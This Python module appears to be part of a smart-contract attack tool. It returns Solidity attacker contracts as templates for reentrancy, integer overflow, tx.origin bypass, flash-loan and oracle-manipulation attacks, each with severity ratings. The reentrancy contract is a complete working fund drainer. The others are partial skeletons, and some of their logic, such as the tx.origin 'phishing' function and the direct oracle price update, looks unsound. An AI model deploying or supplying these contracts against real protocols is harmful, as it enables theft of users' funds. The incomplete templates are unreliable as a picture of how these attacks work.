"""
Exploit Templates - Common exploit patterns and templates
"""

from typing import Dict, List

class ExploitTemplates:
    """Collection of common exploit patterns and templates"""
    
    @staticmethod
    def get_reentrancy_template() -> str:
        """Get reentrancy attack contract template"""
        return '''
pragma solidity ^0.8.0;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerableContract public vulnerable;
    address public owner;
    uint256 public attackAmount;
    uint256 public callbackCount;
    uint256 public maxCallbacks;
    
    constructor(address _vulnerable) {
        vulnerable = IVulnerableContract(_vulnerable);
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function attack(uint256 _amount, uint256 _maxCallbacks) external payable onlyOwner {
        require(msg.value >= _amount, "Insufficient funds");
        
        attackAmount = _amount;
        maxCallbacks = _maxCallbacks;
        callbackCount = 0;
        
        vulnerable.deposit{value: _amount}();
        vulnerable.withdraw(_amount);
    }
    
    fallback() external payable {
        callbackCount++;
        if (callbackCount < maxCallbacks && address(vulnerable).balance >= attackAmount) {
            vulnerable.withdraw(attackAmount);
        }
    }
    
    receive() external payable {
        if (callbackCount < maxCallbacks && address(vulnerable).balance >= attackAmount) {
            vulnerable.withdraw(attackAmount);
        }
    }
    
    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
'''

    @staticmethod
    def get_overflow_template() -> str:
        """Get integer overflow attack template"""
        return '''
pragma solidity ^0.7.6; // Use older version without overflow protection

contract OverflowAttacker {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function triggerOverflow(uint256 value) external {
        // Craft payload to cause overflow
        uint256 overflowValue = type(uint256).max - value + 2;
        
        // Call vulnerable function with overflow value
        (bool success,) = target.call(
            abi.encodeWithSignature("vulnerableFunction(uint256)", overflowValue)
        );
        require(success, "Attack failed");
    }
}
'''

    @staticmethod
    def get_access_control_template() -> str:
        """Get access control bypass template"""
        return '''
pragma solidity ^0.8.0;

contract AccessControlAttacker {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function bypassAuth() external {
        // Exploit tx.origin authentication
        (bool success,) = target.call(
            abi.encodeWithSignature("restrictedFunction()")
        );
        require(success, "Access control bypass failed");
    }
    
    function phishingAttack(address victim) external {
        // Use victim as intermediary to bypass tx.origin check
        require(msg.sender == victim, "Only victim can call");
        (bool success,) = target.call(
            abi.encodeWithSignature("restrictedFunction()")
        );
        require(success, "Phishing attack failed");
    }
}
'''

    @staticmethod
    def get_flash_loan_template() -> str:
        """Get flash loan attack template"""
        return '''
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IFlashLoanProvider {
    function flashLoan(address asset, uint256 amount, bytes calldata data) external;
}

contract FlashLoanAttacker {
    IFlashLoanProvider public flashLoanProvider;
    address public targetProtocol;
    IERC20 public token;
    
    constructor(address _provider, address _target, address _token) {
        flashLoanProvider = IFlashLoanProvider(_provider);
        targetProtocol = _target;
        token = IERC20(_token);
    }
    
    function executeAttack(uint256 loanAmount) external {
        // Initiate flash loan
        flashLoanProvider.flashLoan(
            address(token),
            loanAmount,
            abi.encode("attack")
        );
    }
    
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        bytes calldata data
    ) external {
        // Flash loan callback - execute attack logic here
        
        // 1. Manipulate price oracle or exploit vulnerability
        _manipulateProtocol(amount);
        
        // 2. Extract profit
        _extractProfit();
        
        // 3. Repay flash loan
        uint256 repayAmount = amount + premium;
        token.transfer(msg.sender, repayAmount);
    }
    
    function _manipulateProtocol(uint256 amount) internal {
        // Protocol-specific manipulation logic
    }
    
    function _extractProfit() internal {
        // Extract profit from manipulated state
    }
}
'''

    @staticmethod
    def get_oracle_manipulation_template() -> str:
        """Get oracle manipulation attack template"""
        return '''
pragma solidity ^0.8.0;

interface IPriceOracle {
    function getPrice(address token) external view returns (uint256);
    function updatePrice(address token, uint256 price) external;
}

interface IDEXPool {
    function swap(uint256 amountIn, address tokenIn, address tokenOut) external;
    function getReserves() external view returns (uint256, uint256);
}

contract OracleManipulationAttacker {
    IPriceOracle public oracle;
    IDEXPool public pool;
    address public targetProtocol;
    
    constructor(address _oracle, address _pool, address _target) {
        oracle = IPriceOracle(_oracle);
        pool = IDEXPool(_pool);
        targetProtocol = _target;
    }
    
    function executeAttack() external {
        // 1. Get initial price
        uint256 initialPrice = oracle.getPrice(address(0));
        
        // 2. Manipulate pool to change price
        _manipulatePool();
        
        // 3. Update oracle with manipulated price
        uint256 manipulatedPrice = _calculateManipulatedPrice();
        oracle.updatePrice(address(0), manipulatedPrice);
        
        // 4. Exploit target protocol with manipulated price
        _exploitProtocol();
        
        // 5. Restore price (optional)
        oracle.updatePrice(address(0), initialPrice);
    }
    
    function _manipulatePool() internal {
        // Execute large swap to move pool price
    }
    
    function _calculateManipulatedPrice() internal view returns (uint256) {
        // Calculate new price based on manipulated pool
        (uint256 reserve0, uint256 reserve1) = pool.getReserves();
        return (reserve1 * 1e18) / reserve0;
    }
    
    function _exploitProtocol() internal {
        // Exploit target protocol using manipulated price
    }
}
'''

    @staticmethod
    def get_all_templates() -> Dict[str, str]:
        """Get all available exploit templates"""
        return {
            'reentrancy': ExploitTemplates.get_reentrancy_template(),
            'overflow': ExploitTemplates.get_overflow_template(),
            'access_control': ExploitTemplates.get_access_control_template(),
            'flash_loan': ExploitTemplates.get_flash_loan_template(),
            'oracle_manipulation': ExploitTemplates.get_oracle_manipulation_template()
        }

    @staticmethod
    def get_template_info() -> Dict[str, Dict]:
        """Get information about available templates"""
        return {
            'reentrancy': {
                'name': 'Reentrancy Attack',
                'description': 'Exploits reentrancy vulnerability in withdraw functions',
                'severity': 'High',
                'gas_estimate': 500000
            },
            'overflow': {
                'name': 'Integer Overflow Attack',
                'description': 'Exploits integer overflow in arithmetic operations',
                'severity': 'Medium',
                'gas_estimate': 300000
            },
            'access_control': {
                'name': 'Access Control Bypass',
                'description': 'Bypasses authentication using tx.origin vulnerability',
                'severity': 'Medium',
                'gas_estimate': 200000
            },
            'flash_loan': {
                'name': 'Flash Loan Attack',
                'description': 'Uses flash loans to exploit DeFi protocols',
                'severity': 'High',
                'gas_estimate': 1000000
            },
            'oracle_manipulation': {
                'name': 'Oracle Manipulation',
                'description': 'Manipulates price oracles to exploit protocols',
                'severity': 'High',
                'gas_estimate': 800000
            }
        }
